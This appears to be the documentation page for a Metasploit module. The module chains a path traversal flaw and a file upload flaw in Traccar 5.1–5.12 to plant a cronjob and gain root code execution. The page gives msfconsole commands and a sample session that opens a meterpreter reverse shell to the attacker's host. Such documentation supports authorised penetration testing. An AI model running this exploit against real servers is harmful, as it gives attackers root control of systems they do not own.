## Vulnerable Application

This module exploits two vulnerabilities in Traccar v5.1 - v5.12 to obtain remote code execution: A path traversal vulnerability
(CVE-2024-24809) and an unrestricted file upload vulnerability (CVE-2024-31214). By default, the application allows self-registration,
enabling any user to register an account and exploit the issues. Moreover, the application runs by default with root privileges,
potentially resulting in a complete system compromise.
This module, which should work on any Red Hat-based Linux system, exploits these issues by adding a new cronjob file that executes the
specified payload.

## Testing

The software can be obtained from
[the vendor](https://github.com/traccar/traccar/releases/download/v5.12/traccar-linux-64-5.12.zip).

Installation instructions are available [here](https://www.traccar.org/linux/).

The vulnerable application runs by default on Eclipse Jetty, which listens on TCP port 8082.

**Successfully tested on**

- Traccar v5.12 on Rocky Linux 9.4
- Traccar v5.11 on Rocky Linux 9.4

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > use exploit/linux/http/traccar_rce_upload  
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/traccar_rce_upload) > set RHOSTS <IP>
msf6 exploit(linux/http/traccar_rce_upload) > set LHOST <IP>
msf6 exploit(linux/http/traccar_rce_upload) > exploit
```

You should get a meterpreter session in the context of `root`.

## Options

### USERNAME
Username to be used when creating a new user.

### PASSWORD
Password for the new user.

### EMAIL
E-mail for the new user.

## Scenarios

Running the exploit against Traccar v5.12 on Rocky Linux 9.4, using curl as a fetch command, should result in an output similar
to the following:

```
msf6 exploit(linux/http/traccar_rce_upload) > exploit 

[*] Started reverse TCP handler on 192.168.217.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Registering new user...
[*] Authenticating...
[*] Adding new device...
[*] Uploading crontab file...
[*] Cronjob successfully written - waiting for execution...
[*] Sending stage (3045380 bytes) to 192.168.217.138
[*] Meterpreter session 1 opened (192.168.217.128:4444 -> 192.168.217.138:58196) at 2024-08-25 17:03:02 -0400
[*] Exploit finished, check thy shell.

meterpreter > sysinfo 
Computer     : localhost.localdomain
OS           : Red Hat 9.4 (Linux 5.14.0-427.13.1.el9_4.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

meterpreter > getuid 
Server username: root
```
